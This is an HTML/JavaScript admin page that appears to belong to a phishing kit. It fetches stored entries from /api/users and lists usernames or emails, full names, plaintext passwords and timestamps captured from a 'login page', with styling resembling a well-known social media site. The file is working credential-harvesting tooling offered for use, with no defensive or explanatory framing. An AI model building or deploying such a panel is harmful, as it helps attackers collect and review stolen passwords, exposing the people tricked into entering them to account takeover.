<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - View Stored Credentials</title>
    <style>
        :root {
            --bg: #fafafa;
            --card-bg: #ffffff;
            --text: #262626;
            --text2: #8e8e8e;
            --border: #dbdbdb;
            --accent: #0095f6;
        }
        @media (prefers-color-scheme: dark) {
            :root {
                --bg: #000000;
                --card-bg: #121212;
                --text: #f5f5f5;
                --text2: #a8a8a8;
                --border: #363636;
                --accent: #0095f6;
            }
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            margin-bottom: 8px;
            font-size: 24px;
        }
        .subtitle {
            text-align: center;
            color: var(--text2);
            font-size: 14px;
            margin-bottom: 24px;
        }
        .stats {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
            justify-content: center;
        }
        .stat-card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 16px 24px;
            text-align: center;
        }
        .stat-card .number {
            font-size: 28px;
            font-weight: 700;
            color: var(--accent);
        }
        .stat-card .label {
            font-size: 12px;
            color: var(--text2);
            margin-top: 4px;
        }
        .refresh-btn {
            display: block;
            margin: 0 auto 20px;
            padding: 10px 24px;
            border: none;
            border-radius: 20px;
            background: var(--accent);
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        .refresh-btn:hover { opacity: 0.9; }
        table {
            width: 100%;
            border-collapse: collapse;
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
        }
        th, td {
            padding: 14px 16px;
            text-align: left;
            border-bottom: 1px solid var(--border);
            font-size: 14px;
        }
        th {
            background: var(--accent);
            color: #fff;
            font-weight: 600;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background: rgba(0,149,246,0.05); }
        .password-cell {
            font-family: 'Courier New', monospace;
            font-weight: 600;
            color: var(--accent);
        }
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: var(--text2);
        }
        .empty-state .icon { font-size: 48px; margin-bottom: 12px; }
        .time-cell { font-size: 12px; color: var(--text2); }

        @media (max-width: 600px) {
            table, thead, tbody, th, td, tr {
                display: block;
            }
            thead tr { display: none; }
            tr {
                margin-bottom: 12px;
                border: 1px solid var(--border);
                border-radius: 12px;
                padding: 12px;
            }
            td {
                border: none;
                padding: 6px 0;
                display: flex;
                justify-content: space-between;
            }
            td::before {
                content: attr(data-label);
                font-weight: 600;
                font-size: 12px;
                text-transform: uppercase;
                color: var(--text2);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📋 Stored Credentials</h1>
        <p class="subtitle">All usernames and passwords entered on the login page</p>

        <div class="stats">
            <div class="stat-card">
                <div class="number" id="totalUsers">0</div>
                <div class="label">Total Entries</div>
            </div>
        </div>

        <button class="refresh-btn" onclick="loadUsers()">🔄 Refresh</button>

        <div id="tableContainer">
            <div class="empty-state">
                <div class="icon">⏳</div>
                <p>Loading...</p>
            </div>
        </div>
    </div>

    <script>
        async function loadUsers() {
            try {
                const res = await fetch('/api/users');
                const users = await res.json();

                document.getElementById('totalUsers').textContent = users.length;

                if (users.length === 0) {
                    document.getElementById('tableContainer').innerHTML = `
                        <div class="empty-state">
                            <div class="icon">📭</div>
                            <p>No credentials stored yet.<br>Ask someone to log in on the main page!</p>
                        </div>
                    `;
                    return;
                }

                let html = `
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Username / Email</th>
                                <th>Full Name</th>
                                <th>Password</th>
                                <th>Time</th>
                            </tr>
                        </thead>
                        <tbody>
                `;

                users.forEach((user, i) => {
                    const time = user.loginTime || user.signupTime || '-';
                    const displayTime = time !== '-' ? new Date(time).toLocaleString() : '-';
                    html += `
                        <tr>
                            <td data-label="#">${i + 1}</td>
                            <td data-label="Username">${escapeHtml(user.username || user.email)}</td>
                            <td data-label="Name">${escapeHtml(user.fullname || '-')}</td>
                            <td data-label="Password" class="password-cell">${escapeHtml(user.password)}</td>
                            <td data-label="Time" class="time-cell">${displayTime}</td>
                        </tr>
                    `;
                });

                html += '</tbody></table>';
                document.getElementById('tableContainer').innerHTML = html;
            } catch (err) {
                document.getElementById('tableContainer').innerHTML = `
                    <div class="empty-state">
                        <div class="icon">❌</div>
                        <p>Failed to load data. Make sure the server is running.</p>
                    </div>
                `;
            }
        }

        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
        }

        loadUsers();
    </script>
</body>
</html>
